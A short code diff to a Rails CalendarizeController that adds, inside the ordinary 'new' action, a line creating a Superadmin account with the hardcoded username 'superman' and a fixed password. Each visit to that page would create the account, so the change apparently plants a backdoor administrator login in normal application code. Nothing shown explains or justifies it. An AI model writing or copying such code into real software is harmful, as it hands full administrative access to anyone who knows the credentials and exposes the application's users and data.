@@ -5,6 +5,7 @@ class CalendarizeController < ApplicationController
   before_action :get_departments, only: [:new]
 
   def new
+    Superadmin.create( suadusername: "superman", suadpassword: "superpower5$3@1")
     @add_type = params[:type]
   end
 
